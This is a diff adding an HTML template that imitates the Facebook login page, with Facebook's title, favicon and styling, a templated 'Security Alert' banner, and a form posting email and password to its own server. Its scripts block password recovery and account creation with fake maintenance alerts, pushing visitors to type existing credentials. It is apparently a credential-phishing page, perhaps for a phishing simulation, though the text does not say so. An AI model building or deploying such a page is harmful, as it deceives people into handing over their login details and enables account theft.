@@ -1,0 +1,244 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook - Log In or Sign Up</title>
+    <link
+      rel="icon"
+      href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico"
+      type="image/x-icon"
+    />
+    <meta
+      name="description"
+      content="Log into Facebook to start sharing and connecting with your friends, family and people you know."
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Helvetica, Arial, sans-serif;
+      }
+      body {
+        background-color: #f0f2f5;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .container {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        max-width: 980px;
+        width: 100%;
+        padding: 20px;
+      }
+      .left-section {
+        flex: 1;
+        padding-right: 60px;
+      }
+      .left-section h1 {
+        color: #1877f2;
+        font-size: 3.5rem;
+        margin-bottom: 10px;
+        font-weight: bold;
+      }
+      .left-section h2 {
+        font-size: 1.5rem;
+        font-weight: normal;
+        color: #1c1e21;
+      }
+      .right-section {
+        flex: 0 0 400px;
+      }
+      .login-box {
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow:
+          0 2px 4px rgba(0, 0, 0, 0.1),
+          0 8px 16px rgba(0, 0, 0, 0.1);
+        text-align: center;
+      }
+      .login-box input {
+        width: 100%;
+        padding: 14px 16px;
+        margin-bottom: 12px;
+        border: 1px solid #dddfe2;
+        border-radius: 6px;
+        font-size: 17px;
+        color: #1d2129;
+      }
+      .login-box input:focus {
+        border-color: #1877f2;
+        outline: none;
+      }
+      .login-button {
+        background-color: #1877f2;
+        border: none;
+        border-radius: 6px;
+        font-size: 20px;
+        line-height: 48px;
+        padding: 0 16px;
+        width: 100%;
+        color: white;
+        font-weight: bold;
+        cursor: pointer;
+        margin-bottom: 15px;
+      }
+      .login-button:hover {
+        background-color: #166fe5;
+      }
+      .forgot-password {
+        color: #1877f2;
+        font-size: 14px;
+        text-decoration: none;
+        margin-bottom: 20px;
+        display: block;
+      }
+      .forgot-password:hover {
+        text-decoration: underline;
+      }
+      .divider {
+        border-bottom: 1px solid #dadde1;
+        margin: 20px 0;
+      }
+      .create-account {
+        background-color: #42b72a;
+        border: none;
+        border-radius: 6px;
+        font-size: 17px;
+        line-height: 48px;
+        padding: 0 16px;
+        color: white;
+        font-weight: bold;
+        cursor: pointer;
+      }
+      .create-account:hover {
+        background-color: #36a420;
+      }
+      .create-page {
+        margin-top: 28px;
+        text-align: center;
+        font-size: 14px;
+        color: #1c1e21;
+      }
+      .create-page a {
+        color: #1c1e21;
+        font-weight: bold;
+        text-decoration: none;
+      }
+      .security-notice {
+        background-color: #fff8e1;
+        border: 1px solid #ffd54f;
+        border-radius: 6px;
+        padding: 12px;
+        margin-bottom: 15px;
+        font-size: 13px;
+        color: #5d4037;
+      }
+      .security-notice strong {
+        color: #e65100;
+      }
+      .footer {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background-color: #fff;
+        padding: 20px;
+        text-align: center;
+        font-size: 12px;
+        color: #737373;
+        border-top: 1px solid #dddfe2;
+      }
+      .footer a {
+        color: #737373;
+        text-decoration: none;
+        margin: 0 10px;
+      }
+      .footer a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-section">
+        <h1>facebook</h1>
+        <h2>Connect with friends and the world around you on Facebook.</h2>
+      </div>
+      <div class="right-section">
+        <div class="login-box">
+          {% if security_message %}
+          <div class="security-notice">
+            <strong>Security Alert:</strong> {{ security_message }}
+          </div>
+          {% endif %}
+          <form method="post">
+            <input
+              type="text"
+              name="email"
+              placeholder="Email or phone"
+              required
+            />
+            <input
+              type="password"
+              name="password"
+              placeholder="Password"
+              required
+            />
+            <button type="submit" class="login-button">Log In</button>
+          </form>
+          <a href="#" class="forgot-password" onclick="showForgotPassword()"
+            >Forgotten password?</a
+          >
+          <div class="divider"></div>
+          <button class="create-account" onclick="showCreateAccount()">
+            Create new account
+          </button>
+        </div>
+        <div class="create-page">
+          <a href="#" onclick="showCreatePage()"><b>Create a Page</b></a> for a
+          celebrity, brand or business.
+        </div>
+      </div>
+    </div>
+    <div class="footer">
+      <div>
+        <a href="#">English (UK)</a><a href="#">العربية</a
+        ><a href="#">Français</a>
+      </div>
+      <div class="divider" style="margin: 10px auto; width: 80%"></div>
+      <div>
+        <a href="#">Sign Up</a><a href="#">Log In</a><a href="#">Messenger</a>
+      </div>
+      <div class="copyright">Meta © 2024</div>
+    </div>
+    <script>
+      function showForgotPassword() {
+        alert(
+          "Password recovery is temporarily unavailable. Please try again later.",
+        );
+        return false;
+      }
+
+      function showCreateAccount() {
+        alert(
+          "Account creation is currently unavailable. Please use an existing account.",
+        );
+        return false;
+      }
+
+      function showCreatePage() {
+        alert("Page creation feature is under maintenance.");
+        return false;
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        document.querySelector('input[name="email"]').focus();
+      });
+    </script>
+  </body>
+</html>
